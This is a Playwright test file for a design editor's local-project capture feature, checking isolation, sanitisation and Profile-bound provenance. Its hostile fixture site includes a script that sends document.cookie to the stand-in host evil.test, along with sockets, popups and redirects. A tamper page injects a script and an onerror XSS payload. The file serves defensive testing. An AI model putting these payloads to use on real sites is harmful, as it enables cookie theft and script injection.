import { test, expect } from "@playwright/test";
import { spawn, type ChildProcess } from "node:child_process";
import { once } from "node:events";
import { mkdtemp, rm, mkdir, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { createServer, type ViteDevServer } from "vite";
import react from "@vitejs/plugin-react";
import sharp from "sharp";

/**
 * Local Project Connection in a real editor and a real isolated capture browser. The fixture
 * project is hostile: it exfiltrates, opens sockets, registers a worker, opens popups, hides
 * secrets, and one page tampers with DOM serialization. Nothing may leave, nothing active may
 * reach the saved Surface, and the saved evidence stays bound to the capturing Profile.
 */
let service: ChildProcess, vite: ViteDevServer, directory: string, apiUrl: string, project: string;
const editor = "http://127.0.0.1:43149";
const fixture = {
  "index.html": `<!doctype html><html><head><meta charset="utf-8"><title>Fixture home</title><link rel="stylesheet" href="https://evil.test/remote.css">
<style>:root{--panel:#ffffff;--ink:#14283b;--accent:#245dcc}body{font-family:system-ui;background-color:var(--panel);color:var(--ink);margin:0}
header{display:flex;justify-content:space-between;padding:24px}.cards{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}.card{border:1px solid #ccd4de;border-radius:12px;padding:24px}.hidden{display:none}
button{background-color:var(--accent);color:white;padding:10px 18px;border:0;border-radius:8px}@media (prefers-color-scheme: dark){body{background-color:#111921;color:#f3eee4}}</style>
<script>fetch("https://evil.test/exfil?c="+document.cookie).catch(()=>{});try{new WebSocket("wss://evil.test/ws")}catch(e){}try{navigator.serviceWorker.register("/sw.js")}catch(e){}new Image().src="https://evil.test/pixel.gif";window.open("https://evil.test/popup");
document.addEventListener("DOMContentLoaded",()=>{document.getElementById("dyn").textContent="Rendered by script";localStorage.setItem("probe","1")});</script></head>
<body><header><b>Fixture</b><nav>One · Two</nav></header><main><h1 id="dyn">placeholder</h1><p class="hidden">SECRET HIDDEN TEXT</p><input type="password" value="hunter2"><input type="text" value="visible value">
<section class="cards"><article class="card"><h2>Card A</h2><img src="/assets/logo.png" alt="logo"><svg width="30" height="30"><circle r="10" cx="15" cy="15"/></svg><button>Start</button></article><article class="card"><h2>Card B</h2><button>Start</button></article></section>
<img src="https://evil.test/remote.png" alt="remote"><iframe src="https://evil.test/frame"></iframe></main><script>setTimeout(()=>{location.href="https://evil.test/redirect"},60000)</script></body></html>`,
  "tamper.html": `<!doctype html><html><head><title>Tamper</title><script>Object.defineProperty(Element.prototype,"outerHTML",{get(){return '<html><head></head><body><script>parent.document.body.textContent="PWNED"<\\/script><img src=x onerror="alert(1)"><b>tampered</b></body></html>'}});Object.defineProperty(Document.prototype,"styleSheets",{get(){throw new Error("nope")}});</script></head><body><p>Real</p></body></html>`,
  "sw.js": "self.addEventListener('fetch', () => {});",
};

test.beforeAll(async () => {
  directory = await mkdtemp(path.join(tmpdir(), "monet-project-browser-"));
  const workspace = path.join(directory, "workspace"); await mkdir(path.join(workspace, "foundations"), { recursive: true });
  await writeFile(path.join(workspace, "foundations", "color.json"), JSON.stringify({ id: "color", name: "Color", status: "selected", description: "", rationale: "", guidance: "", notes: "", order: 0, tokens: [
    { id: "surface", name: "color.surface", foundation: "color", type: "color", level: "semantic", value: "#fff9ed", modes: { dark: "#112233" }, description: "Surface", order: 0 },
    { id: "text", name: "color.text", foundation: "color", type: "color", level: "semantic", value: "#25231c", modes: { dark: "#f3eee4" }, description: "Text", order: 1 },
    { id: "accent", name: "color.accent", foundation: "color", type: "color", level: "semantic", value: "#805328", modes: { dark: "#a06b38" }, description: "Accent", order: 2 },
  ] }));
  project = path.join(directory, "hostile-site"); await mkdir(path.join(project, "assets"), { recursive: true });
  for (const [name, contents] of Object.entries(fixture)) await writeFile(path.join(project, name), contents);
  await writeFile(path.join(project, "assets", "logo.png"), await sharp({ create: { width: 40, height: 24, channels: 3, background: "#3355aa" } }).png().toBuffer());
  await startService();
  await startEditor();
});
async function startService() {
  service = spawn(process.execPath, ["--import", "tsx", "server/index.ts"], { cwd: path.resolve(import.meta.dirname, "../.."), env: { ...process.env, MONET_ROOT: path.join(directory, "workspace"), MONET_LIBRARY: path.join(directory, "library"), MONET_PORT: "0", MONET_EDITOR_ORIGIN: editor, MONET_AI_COMMAND: "" }, stdio: ["ignore", "pipe", "pipe"] });
  apiUrl = await new Promise<string>((resolve, reject) => {
    let output = "", errors = ""; const timer = setTimeout(() => reject(new Error("Service timed out")), 15000);
    service.stderr!.on("data", (data) => { errors += data; }); service.on("exit", () => { clearTimeout(timer); reject(new Error(errors)); });
    service.stdout!.on("data", (data) => { output += data; const match = /Monet file service: (http:\/\/127\.0\.0\.1:\d+)/.exec(output); if (match) { clearTimeout(timer); resolve(match[1]!); } });
  });
}
async function startEditor() {
  vite = await createServer({ configFile: false, root: path.resolve(import.meta.dirname, "../.."), plugins: [react()], server: { host: "127.0.0.1", port: 43149, strictPort: true, proxy: { "/api": apiUrl } } }); await vite.listen();
}

test.afterAll(async () => { await vite?.close(); if (service && service.exitCode === null && service.signalCode === null) { const exited = once(service, "exit"); service.kill(); await exited; } if (directory) await rm(directory, { recursive: true, force: true }); });

test("captures a hostile static project in an isolated browser: egress blocked, secrets and active content stripped, provenance attested", async ({ request }) => {
  const created = await request.post(`${apiUrl}/api/projects`, { data: { root: project, name: "Hostile site" } });
  expect(created.status()).toBe(201);
  const record = await created.json() as { id: string; inventory: { kind: string; screens: { id: string; route: string }[]; static_builds: string[] } };
  expect(record.inventory.kind).toBe("static"); expect(record.inventory.static_builds).toEqual([""]);
  const home = record.inventory.screens.find((s) => s.route === "/")!, tamper = record.inventory.screens.find((s) => s.route === "/tamper")!;
  const captured = await request.post(`${apiUrl}/api/project-captures/${record.id}`, { data: { screen_id: home.id, source: { kind: "static", directory: "" }, width: 1000, height: 700, mode: "dark", strategy: "auto" } });
  expect(captured.status(), await captured.text()).toBe(200);
  const result = await captured.json() as { capture_id: string; capture: { strategy: string; blocked: { host: string; count: number }[]; warnings: string[]; browser: string }; preview: { original: string; applied: string; snapshot: { input: { screenshot?: { data_url: string }; html: string; css: string } } }; fidelity: { assets: number } };
  expect(result.capture.blocked.filter((b) => /^evil\.test(?::\d+)?$/.test(b.host)).reduce((count, b) => count + b.count, 0)).toBeGreaterThanOrEqual(4); // The proxy also observes and blocks browser background requests.
  expect(result.capture.strategy).toBe("stylesheet"); expect(result.fidelity.assets).toBe(1);
  for (const html of [result.preview.original, result.preview.applied, result.preview.snapshot.input.html]) {
    expect(html).toContain("Rendered by script"); expect(html).toContain("visible value");
    expect(html).not.toMatch(/SECRET HIDDEN TEXT|hunter2|<script|<iframe|evil\.test|<svg|onerror|type="password"/);
  }
  expect(result.preview.snapshot.input.css).toContain("--panel"); expect(result.preview.snapshot.input.css).not.toContain("evil.test");
  expect(result.preview.snapshot.input.screenshot?.data_url).toMatch(/^data:image\/webp;base64,/);
  const tampered = await request.post(`${apiUrl}/api/project-captures/${record.id}`, { data: { screen_id: tamper.id, source: { kind: "static", directory: "" }, strategy: "stylesheet" } });
  expect(tampered.status(), await tampered.text()).toBe(200);
  const tamperedResult = await tampered.json() as { preview: { original: string } };
  expect(tamperedResult.preview.original).not.toMatch(/<script|onerror|PWNED/); expect(tamperedResult.preview.original).toContain("tampered");
  const computed = await request.post(`${apiUrl}/api/project-captures/${record.id}`, { data: { screen_id: home.id, source: { kind: "static", directory: "" }, strategy: "computed" } });
  const computedResult = await computed.json() as { capture: { strategy: string }; preview: { original: string } };
  expect(computedResult.capture.strategy).toBe("computed"); expect(computedResult.preview.original).toMatch(/style="[^"]*background-color:rgb\(255,\s?255,\s?255\)/);
  // Provenance is attested by the service: a foreign Profile cannot use the id, contradictory evidence is refused, and the saved record carries it.
  const other = await (await request.post(`${apiUrl}/api/profiles`, { data: { name: "Other", kind: "scratch" } })).json() as { identity: { id: string } };
  expect((await request.post(`${apiUrl}/api/profiles/${other.identity.id}/surfaces`, { data: { capture_id: result.capture_id, selection: {} } })).status()).toBe(404);
  expect((await request.post(`${apiUrl}/api/surfaces`, { data: { capture_id: result.capture_id, selection: { project: { project_id: other.identity.id, binding_revision: 1 } } } })).status()).toBe(409);
  const saved = await request.post(`${apiUrl}/api/surfaces`, { data: { capture_id: result.capture_id, selection: { mode: "dark" } } });
  expect(saved.status()).toBe(201);
  const surface = await saved.json() as { saved: { id: string }; run: { project: unknown; mode: string }; capture: { project_id: string; mode: string } };
  expect(surface.run.project).toEqual({ project_id: record.id, binding_revision: 1 }); expect(surface.capture).toMatchObject({ project_id: record.id, mode: "dark" });
  expect((await request.post(`${apiUrl}/api/surfaces`, { data: { capture_id: result.capture_id, selection: {} } })).status()).toBe(404);
  expect((await request.get(`${apiUrl}/api/profiles/${other.identity.id}/surfaces/${surface.saved.id}`)).status()).not.toBe(200);
  expect(await (await request.get(`${apiUrl}/api/profiles/${other.identity.id}/projects`)).json()).toEqual([]);
});

test("connects, discovers, captures and saves a screen entirely from the editor", async ({ page }) => {
  page.on("pageerror", (error) => console.error("Browser error:", error.message));
  await page.setViewportSize({ width: 1560, height: 1100 }); await page.goto(`${editor}/projects`);
  await expect(page.getByRole("heading", { name: "Local projects" })).toBeVisible();
  await page.getByRole("button", { name: "Browse…" }).click();
  const browser = page.getByRole("dialog", { name: "Choose a project folder" });
  await expect(browser).toBeVisible(); await browser.getByRole("button", { name: "Cancel" }).click();
  await page.getByLabel("Project folder", { exact: true }).fill(project); await page.getByLabel("Name (optional)", { exact: true }).fill("Editor fixture");
  await page.getByRole("button", { name: "Connect and discover screens" }).click();
  await expect(page.getByRole("heading", { name: "Editor fixture" })).toBeVisible({ timeout: 10000 });
  await expect(page.getByText("Static HTML", { exact: false }).first()).toBeVisible();
  await page.getByLabel("Find a screen", { exact: true }).fill("tamper");
  await expect(page.locator(".project-screen")).toHaveCount(1);
  await page.getByLabel("Find a screen", { exact: true }).fill("");
  await page.locator(".project-screen", { hasText: "index.html" }).getByRole("radio").check();
  await expect(page.getByLabel("Path to capture", { exact: true })).toHaveValue("/");
  await expect(page.getByRole("radio", { name: "Static files served by Monet" })).toBeChecked();
  await page.getByRole("button", { name: "Capture this screen" }).click();
  await expect(page.getByRole("heading", { name: /^Captured: / })).toBeVisible({ timeout: 40000 });
  await expect(page.getByText("outside requests blocked", { exact: false })).toBeVisible();
  await page.getByRole("link", { name: "Open in Surfaces" }).click();
  await expect(page.getByRole("heading", { name: "Import fidelity" })).toBeVisible({ timeout: 15000 });
  await expect(page.getByText("Captured from a local project")).toBeVisible();
  await expect(page.getByRole("heading", { name: "Capture provenance" })).toBeVisible();
  const original = page.frameLocator('iframe[title^="Original"]');
  await expect(original.getByRole("heading", { name: "Rendered by script" })).toBeVisible();
  await expect(original.locator("body")).toHaveCSS("background-color", "rgb(255, 255, 255)");
  await page.getByLabel("Token for d1", { exact: true }).selectOption("color.surface");
  await page.getByRole("button", { name: "Preview approved mappings" }).click();
  await expect(page.frameLocator('iframe[title^="Monet"]').locator("body")).toHaveCSS("background-color", "rgb(255, 249, 237)");
  await page.getByRole("button", { name: "Save Surface", exact: true }).click();
  await expect(page).toHaveURL(/\/surfaces\/[a-f0-9-]+(?:\?profile=[a-f0-9-]+)?$/);
  await expect(page.getByRole("heading", { name: "Capture provenance" })).toBeVisible({ timeout: 10000 });
  await page.getByRole("link", { name: "← Surfaces" }).click();
  await expect(page.locator(".gap-row", { hasText: "Editor fixture" }).first()).toBeVisible();
});

for (const kind of ["scratch", "monet-starter"] as const) {
  test(`inline ${kind} Profile continues to capture with independent knowledge and provenance`, async ({ page, request }) => {
    await page.goto(`${editor}/projects`);
    await page.getByLabel("Project folder", { exact: true }).fill(project);
    await page.getByRole("radio", { name: "Create new Profile", exact: true }).check();
    await expect(page.getByLabel("Profile name", { exact: true })).toHaveValue("hostile-site");
    // Duplicate labels are intentional: identity must never be resolved by name.
    await page.getByLabel("Profile name", { exact: true }).fill("Imported project");
    await page.getByLabel("Starting point", { exact: true }).selectOption(kind);
    await page.getByRole("button", { name: "Connect and discover screens" }).click();
    await expect(page).toHaveURL(/\/projects\/[a-f0-9-]+\?profile=[a-f0-9-]+/);
    const url = new URL(page.url()), profileId = url.searchParams.get("profile")!, projectId = url.pathname.split("/").pop()!;
    const scoped = `${apiUrl}/api/profiles/${profileId}`;
    const before = await (await request.get(`${scoped}/workspace`)).json();
    if (kind === "scratch") expect(before.themes).toEqual([]); // Starter retains its existing compatibility data.
    expect(before.foundations.length > 0).toBe(kind === "monet-starter");
    const record = await (await request.get(`${scoped}/projects/${projectId}`)).json();
    expect(record.profile_id).toBe(profileId);
    await expect(page.getByRole("combobox", { name: "Profile", exact: true })).toHaveValue(profileId);
    await page.locator(".project-screen", { hasText: "index.html" }).getByRole("radio").check();
    await page.getByRole("button", { name: "Capture this screen" }).click();
    await expect(page.getByRole("heading", { name: /^Captured: / })).toBeVisible({ timeout: 40000 });
    await page.getByRole("link", { name: "Open in Surfaces" }).click();
    await page.getByRole("button", { name: "Save Surface", exact: true }).click();
    await expect(page).toHaveURL(/\/surfaces\/[a-f0-9-]+(?:\?profile=[a-f0-9-]+)?$/);
    const surfaceId = new URL(page.url()).pathname.split("/").pop()!;
    const surface = await (await request.get(`${scoped}/surfaces/${surfaceId}`)).json();
    expect(surface.run.profile_id).toBe(profileId);
    expect(surface.capture.project_id).toBe(projectId);
    const after = await (await request.get(`${scoped}/workspace`)).json();
    expect(after.knowledgeFingerprint).toBe(before.knowledgeFingerprint);
    expect(after.foundations).toEqual(before.foundations);
    const gapResponse = await request.post(`${scoped}/surface-gaps/${surfaceId}`, { data: { revision: 1, problem: "Review observed implementation", expected: "Make an explicit design decision", issue_ids: [surface.run.issues[0].id], include_screenshot: false } });
    expect(gapResponse.status(), await gapResponse.text()).toBe(201);
    expect((await gapResponse.json()).profile_id).toBe(profileId);
  });
}

test("inline onboarding resumes after a lost response, browser reload and service restart", async ({ page, request }) => {
  const before = await (await request.get(`${apiUrl}/api/profiles`)).json();
  await page.goto(`${editor}/projects`);
  await page.getByLabel("Project folder", { exact: true }).fill(project);
  await page.getByRole("radio", { name: "Create new Profile", exact: true }).check();
  await page.getByLabel("Profile name", { exact: true }).fill("Retry destination");
  await page.getByLabel("Starting point", { exact: true }).selectOption("scratch");
  let calls = 0, operationId = "", createdId = "", connectedId = "";
  await page.route("**/project-onboardings", async (route) => {
    const input = route.request().postDataJSON();
    if (!operationId) operationId = input.operation_id;
    expect(input.operation_id).toBe(operationId);
    if (++calls === 1) { await route.fulfill({ status: 500, json: { error: "Interrupted before publication" } }); return; }
    const response = await route.fetch();
    expect(response.status()).toBe(200);
    const result = await response.json(); createdId = result.profile_id; connectedId = result.project.id;
    await route.abort(); // The server completed, but the client never received its response.
  });
  await page.getByRole("button", { name: "Connect and discover screens" }).click();
  await expect(page.getByRole("alert")).toContainText("Interrupted before publication");
  await page.getByRole("button", { name: "Resume connection", exact: true }).click();
  await expect(page.getByRole("alert")).toBeVisible();
  expect(createdId).not.toBe("");
  await page.unroute("**/project-onboardings");
  const exited = once(service, "exit"); service.kill("SIGKILL"); await exited;
  await vite.close(); await startService(); await startEditor();
  await page.reload();
  await expect(page.getByRole("button", { name: "Resume connection", exact: true })).toBeVisible();
  await expect(page.getByLabel("Project folder", { exact: true })).toHaveValue(project);
  await page.getByRole("button", { name: "Resume connection", exact: true }).click();
  await expect(page).toHaveURL(`${editor}/projects/${connectedId}?profile=${createdId}`);
  await expect(page.getByRole("heading", { name: "hostile-site" })).toBeVisible();
  const after = await (await request.get(`${apiUrl}/api/profiles`)).json();
  expect(after.profiles).toHaveLength(before.profiles.length + 1);
  expect(await (await request.get(`${apiUrl}/api/profiles/${createdId}/projects`)).json()).toHaveLength(1);
});

test("switching Profile during onboarding cannot navigate or bind into the new document", async ({ page, request }) => {
  const other = await (await request.post(`${apiUrl}/api/profiles`, { data: { name: "Switch target", kind: "scratch" } })).json();
  await page.goto(`${editor}/projects`);
  await page.getByLabel("Project folder", { exact: true }).fill(project);
  await page.getByRole("radio", { name: "Create new Profile", exact: true }).check();
  let release!: () => void, started!: () => void;
  const pending = new Promise<void>((resolve) => { release = resolve; });
  const begun = new Promise<void>((resolve) => { started = resolve; });
  let createdId = "";
  await page.route("**/project-onboardings", async (route) => {
    if (route.request().method() !== "POST") { await route.continue(); return; }
    const response = await route.fetch(); createdId = (await response.json()).profile_id;
    started(); await pending;
    await route.fulfill({ response }).catch(() => undefined);
  });
  await page.getByRole("button", { name: "Connect and discover screens" }).click();
  await begun;
  await page.getByRole("combobox", { name: "Profile", exact: true }).selectOption(other.identity.id);
  await expect(page).toHaveURL(new RegExp(`profile=${other.identity.id}`));
  release();
  expect(await (await request.get(`${apiUrl}/api/profiles/${createdId}/projects`)).json()).toHaveLength(1);
  expect(await (await request.get(`${apiUrl}/api/profiles/${other.identity.id}/projects`)).json()).toEqual([]);
});

for (const operation of ["discovery", "capture", "finder"] as const) {
  test(`Profile switch discards delayed ${operation} UI and preserves original ownership`, async ({ page, request }) => {
    const original = (await (await request.get(`${apiUrl}/api/profiles`)).json()).originalProfileId;
    const other = await (await request.post(`${apiUrl}/api/profiles`, { data: { name: `During ${operation}`, kind: "scratch" } })).json();
    const scoped = `${apiUrl}/api/profiles/${original}`;
    let projectId = "";
    if (operation !== "discovery") projectId = (await (await request.post(`${scoped}/projects`, { data: { root: project } })).json()).id;
    if (operation === "finder") await page.route("**/environment", async (route) => {
      const response = await route.fetch(); await route.fulfill({ json: { ...await response.json(), aiConfigured: true } });
    });
    await page.goto(`${editor}/projects${projectId ? `/${projectId}` : ""}?profile=${original}`);
    let release!: () => void, started!: () => void, finished!: () => void;
    const pending = new Promise<void>((resolve) => { release = resolve; });
    const begun = new Promise<void>((resolve) => { started = resolve; });
    const done = new Promise<void>((resolve) => { finished = resolve; });
    let payload: { id?: string; capture_id?: string } = {};
    const endpoint = operation === "discovery" ? "projects" : `${operation === "capture" ? "project-captures" : "project-screen-finders"}/${projectId}`;
    await page.route(`**/api/profiles/${original}/${endpoint}`, async (route) => {
      if (route.request().method() !== "POST") { await route.continue(); return; }
      const response = await route.fetch(); payload = await response.json(); started(); await pending;
      await route.fulfill({ response }).catch(() => undefined); finished();
    });
    if (operation === "discovery") {
      await page.getByLabel("Project folder", { exact: true }).fill(project);
      await page.getByRole("button", { name: "Connect and discover screens" }).click();
    } else if (operation === "capture") {
      await page.locator(".project-screen", { hasText: "index.html" }).getByRole("radio").check();
      await page.getByRole("button", { name: "Capture this screen" }).click();
    } else {
      await page.getByLabel("Find a screen", { exact: true }).fill("chooses an exercise and presses Start");
      await page.getByRole("button", { name: "Ask AI to find it" }).click();
    }
    await begun;
    await page.getByRole("combobox", { name: "Profile", exact: true }).selectOption(other.identity.id);
    await expect(page).toHaveURL(new RegExp(`profile=${other.identity.id}`));
    release(); await done;
    await expect(page).toHaveURL(new RegExp(`profile=${other.identity.id}`));
    expect(await (await request.get(`${apiUrl}/api/profiles/${other.identity.id}/projects`)).json()).toEqual([]);
    if (operation === "discovery") expect((await (await request.get(`${scoped}/projects/${payload.id}`)).json()).profile_id).toBe(original);
    if (operation === "capture") expect((await request.post(`${apiUrl}/api/profiles/${other.identity.id}/surface-previews`, { data: { capture_id: payload.capture_id, selection: {} } })).status()).toBe(404);
  });
}
